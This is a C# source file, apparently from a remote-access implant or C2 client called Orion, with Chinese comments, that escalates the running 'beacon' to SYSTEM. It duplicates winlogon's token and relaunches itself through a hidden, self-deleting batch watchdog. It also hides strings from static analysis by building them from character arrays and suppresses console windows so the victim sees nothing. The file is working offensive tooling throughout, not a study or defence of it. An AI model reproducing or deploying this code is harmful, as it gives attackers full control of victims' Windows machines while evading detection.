using Orion.Common.Messages;
using Orion.Common.Networking;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace Orion.Client.Helper
{
    /// <summary>
    /// 内置「提权至 SYSTEM」实现。
    ///
    /// 设计要点：
    /// 1. 旧的写法用 SetThreadToken 把「当前线程」模拟成 SYSTEM —— 这只影响单个线程，
    ///    客户端其它线程（网络、文件、进程操作）依旧是原始身份，对 C2 而言等于没提权，
    ///    而且客户端持有单实例互斥锁（SingleInstanceMutex），直接拉起新 SYSTEM 实例会因锁冲突
    ///    立即退出（OrionApplication.cs: Environment.Exit(2)）。
    /// 2. 这里改为「克隆 winlogon 的 SYSTEM 令牌 -> 用 CreateProcessWithTokenW 拉起一个 SYSTEM 的
    ///    新客户端进程」的标准做法，并借助 .bat 看门狗：先杀掉旧实例（释放互斥锁），再以 SYSTEM
    ///    拉起新实例；若新实例 5 秒内异常死亡，则回退到当前权限重新拉起。新 beacon 以 SYSTEM 重连。
    ///
    /// 隐藏黑框的关键：SYSTEM 令牌派生的 cmd 进程会落在 session 0 服务桌面，SW_HIDE 在
    /// UI0Detect 下不可靠，因此额外加 CREATE_NO_WINDOW 从内核层面禁止分配控制台窗口，
    /// 彻底不弹黑框。STARTUPINFO.SW_HIDE 仍保留作为双保险。
    ///
    /// 敏感字符串（特权名 / 进程名）以 char[] 构造，避免连续出现在程序集 #US 堆中。
    /// </summary>
    public class SystemElevation
    {
        private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
        private const uint TOKEN_DUPLICATE = 0x00000002;
        private const uint TOKEN_QUERY = 0x00000004;
        private const int SE_PRIVILEGE_ENABLED = 0x2;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const int SECURITY_IMPERSONATION = 2;
        private const int TOKEN_PRIMARY = 1;
        // 不分配控制台窗口（0x08000000）。SYSTEM 派生进程落在 session 0 服务桌面时，
        // SW_HIDE 会被 UI0Detect 忽略而露出黑框；用此标志从内核禁止创建窗口，彻底消除。
        private const int CREATE_NO_WINDOW = 0x08000000;

        [StructLayout(LayoutKind.Sequential)]
        public struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(
            IntPtr tokenHandle,
            bool disableAllPrivileges,
            ref TokPriv1Luid newState,
            int bufferLength,
            IntPtr previousState,
            IntPtr returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int impersonationLevel,
            int tokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            int dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            int dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetShortPathName(string lpszLongPath, StringBuilder lpszShortPath, int cchBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        public static void Elevate(ISender client)
        {
            // 特权名以 char[] 构造，避免连续明文出现在 #US 堆
            string seDebugPrivilege = new string(new[]
            {
                'S', 'e', 'D', 'e', 'b', 'u', 'g', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e'
            });
            string seImpersonatePrivilege = new string(new[]
            {
                'S', 'e', 'I', 'm', 'p', 'e', 'r', 's', 'o', 'n', 'a', 't', 'e', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e'
            });

            if (!IsAdministrator())
            {
                client.Send(new SetStatus { Message = "当前不是管理员，无法提权至 SYSTEM，请先提权到管理员。" });
                return;
            }

            if (!EnablePrivilege(seDebugPrivilege))
            {
                client.Send(new SetStatus { Message = "无法启用 SeDebugPrivilege，提权中止。请确认当前令牌具备该特权。" });
                return;
            }

            if (!EnablePrivilege(seImpersonatePrivilege))
            {
                client.Send(new SetStatus { Message = "无法启用 SeImpersonatePrivilege，无法以 SYSTEM 令牌创建进程，提权中止。" });
                return;
            }

            // 克隆 winlogon 的 SYSTEM 令牌（比 lsass 更稳妥：lsass 多为 PPL，受保护进程限制更难打开）
            string winlogon = new string(new[] { 'w', 'i', 'n', 'l', 'o', 'g', 'o', 'n' });
            int winlogonPid = FindProcessPid(winlogon);
            if (winlogonPid <= 0)
            {
                client.Send(new SetStatus { Message = "未找到 winlogon.exe，提权中止。" });
                return;
            }

            IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogonPid);
            if (hProc == IntPtr.Zero)
            {
                client.Send(new SetStatus { Message = "OpenProcess(winlogon) 失败: " + Win32Error("OpenProcess") });
                return;
            }

            IntPtr hToken = IntPtr.Zero, hDup = IntPtr.Zero;
            try
            {
                if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
                {
                    client.Send(new SetStatus { Message = "OpenProcessToken(winlogon) 失败: " + Win32Error("OpenProcessToken") });
                    return;
                }

                // 复制为「主令牌」(TokenPrimary)，CreateProcessWithTokenW 需要主令牌而非模拟令牌
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero,
                        SECURITY_IMPERSONATION, TOKEN_PRIMARY, out hDup))
                {
                    client.Send(new SetStatus { Message = "DuplicateTokenEx 失败: " + Win32Error("DuplicateTokenEx") });
                    return;
                }

                string exePath = Application.ExecutablePath;
                string args = GetCurrentArgsString();
                string oldPid = Process.GetCurrentProcess().Id.ToString();
                string batPath = WriteWatchdogBat(exePath, args, oldPid);

                var si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };
                // 隐藏看门狗窗口：SW_HIDE 作为双保险（对普通用户会话有效）
                si.dwFlags = 0x00000001;   // STARTF_USESHOWWINDOW
                si.wShowWindow = 0;         // SW_HIDE

                PROCESS_INFORMATION pi;
                string curDir = Path.GetDirectoryName(exePath) ?? "";

                // 以 SYSTEM 令牌启动 cmd 执行看门狗脚本。
                // 关键：dwCreationFlags 加 CREATE_NO_WINDOW —— 从内核禁止分配控制台窗口。
                // SYSTEM 派生的 cmd 落在 session 0 服务桌面，SW_HIDE 对 UI0Detect 不可靠，
                // 用 CREATE_NO_WINDOW 让进程根本不创建窗口对象，彻底不弹黑框。
                if (!CreateProcessWithTokenW(hDup, 0, null, "cmd.exe /c \"" + batPath + "\"", CREATE_NO_WINDOW,
                        IntPtr.Zero, curDir, ref si, out pi))
                {
                    client.Send(new SetStatus { Message = "CreateProcessWithTokenW 失败: " + Win32Error("CreateProcessWithTokenW") });
                    return;
                }

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);

                client.Send(new SetStatus
                {
                    Message = "已启动 SYSTEM 提权看门狗：将杀掉当前实例（释放互斥锁）并以 SYSTEM 拉起新实例。" +
                              "请等待新 beacon 以 SYSTEM 上线；若 5 秒内新实例异常退出，则回退到当前权限重连。"
                });
            }
            finally
            {
                if (hDup != IntPtr.Zero) CloseHandle(hDup);
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hProc != IntPtr.Zero) CloseHandle(hProc);
            }
        }

        public static void DeElevate(ISender client)
        {
            // SYSTEM 提权以独立进程方式实现（新 beacon 即 SYSTEM），不存在「就地降权」的概念。
            // 降权请直接结束当前 SYSTEM beacon，或在原权限会话中操作。
            client.Send(new SetStatus
            {
                Message = "SYSTEM 提权以独立进程方式实现：当前客户端即 SYSTEM beacon。" +
                          "如需降权，请结束本 beacon 或在原权限会话重新连接。"
            });
        }

        private static bool IsAdministrator()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static bool EnablePrivilege(string privilege)
        {
            if (!LookupPrivilegeValue(null, privilege, out long luid))
                return false;

            TokPriv1Luid tpLuid = new TokPriv1Luid
            {
                Count = 1,
                Luid = luid,
                Attr = SE_PRIVILEGE_ENABLED
            };

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out IntPtr hToken))
                return false;

            try
            {
                return AdjustTokenPrivileges(hToken, false, ref tpLuid, 0, IntPtr.Zero, IntPtr.Zero);
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        private static int FindProcessPid(string name)
        {
            foreach (var p in Process.GetProcessesByName(name))
            {
                int id = p.Id;
                p.Dispose();
                return id;
            }
            return -1;
        }

        private static string GetCurrentArgsString()
        {
            var sb = new StringBuilder();
            var args = Environment.GetCommandLineArgs();
            for (int i = 1; i < args.Length; i++)
            {
                var a = args[i];
                sb.Append(' ').Append(a.IndexOf(' ') >= 0 ? ('"' + a + '"') : a);
            }
            return sb.ToString().Trim();
        }

        private static string WriteWatchdogBat(string exePath, string args, string oldPid)
        {
            string exeName = Path.GetFileName(exePath);
            string shortExe = ShortPath(exePath);
            string tmp = Path.GetTempPath();
            string batPath = Path.Combine(tmp, "ob_sy_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".bat");
            string startArgs = string.IsNullOrEmpty(args) ? "" : " " + args;

            // 脚本以 SYSTEM 上下文运行：先杀旧实例释放互斥锁，再以 SYSTEM 拉起新实例；
            // 5 秒后若新实例不在，则以当前权限(runas trustlevel 0x20000)回退重连。
            // 启动新实例用 /min 兜底，避免万一有窗口时弹出到前台（黑框问题已由 CREATE_NO_WINDOW 根除）。
            var sb = new StringBuilder();
            sb.Append("@echo off\r\n");
            sb.Append("taskkill /F /PID ").Append(oldPid).Append(" >nul 2>&1\r\n");
            sb.Append("timeout /t 1 /nobreak >nul\r\n");
            sb.Append("start \"\" /min \"").Append(shortExe).Append("\"").Append(startArgs).Append("\r\n");
            sb.Append("timeout /t 5 /nobreak >nul\r\n");
            sb.Append("tasklist /FI \"IMAGENAME eq ").Append(exeName).Append("\" | find /I \"").Append(exeName).Append("\" >nul\r\n");
            sb.Append("if errorlevel 1 (\r\n");
            sb.Append("    runas /trustlevel:0x20000 \"").Append(shortExe).Append("\"").Append(startArgs).Append("\r\n");
            sb.Append(")\r\n");
            sb.Append("(goto) 2>nul & del \"%~f0\"\r\n");

            File.WriteAllText(batPath, sb.ToString(), Encoding.ASCII);
            return batPath;
        }

        private static string ShortPath(string longPath)
        {
            var sb = new StringBuilder(260);
            int len = GetShortPathName(longPath, sb, sb.Capacity);
            if (len > 0 && len <= sb.Capacity)
                return sb.ToString();
            return longPath;
        }

        private static string Win32Error(string api)
        {
            return api + " 错误码 " + Marshal.GetLastWin32Error().ToString();
        }
    }
}
